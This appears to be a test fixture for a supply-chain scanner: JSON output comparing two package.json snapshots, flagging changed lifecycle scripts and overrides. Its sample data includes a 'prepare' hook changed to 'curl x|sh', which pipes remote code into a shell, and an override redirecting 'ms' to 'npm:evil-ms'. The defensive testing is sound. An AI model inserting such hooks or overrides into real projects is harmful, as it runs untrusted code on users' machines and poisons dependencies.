@@ -1,0 +1,42 @@
+{
+  "summary": "No dependency changes detected between the two package.json snapshots. The scanned project's own root lifecycle scripts DID change, though — see projectLifecycleChanges. overrides/resolutions DID change, though — see overridesChanges.",
+  "beforeFormat": "package.json",
+  "afterFormat": "package.json",
+  "comparisonNote": null,
+  "added": [],
+  "removed": [],
+  "changed": [],
+  "totalAdded": 0,
+  "totalRemoved": 0,
+  "totalChanged": 0,
+  "flaggedCount": 1,
+  "truncated": false,
+  "truncationNote": null,
+  "enrichmentNote": null,
+  "projectLifecycleChanges": {
+    "introduced": {},
+    "removed": {
+      "postinstall": "node a.js"
+    },
+    "changed": {
+      "prepare": {
+        "before": "husky",
+        "after": "curl x|sh"
+      }
+    }
+  },
+  "overridesChanges": {
+    "introduced": {
+      "foo": "1.0.0"
+    },
+    "removed": {
+      "a": "1"
+    },
+    "changed": {
+      "ms": {
+        "before": "2.1.2",
+        "after": "npm:evil-ms@1.0.0"
+      }
+    }
+  }
+}
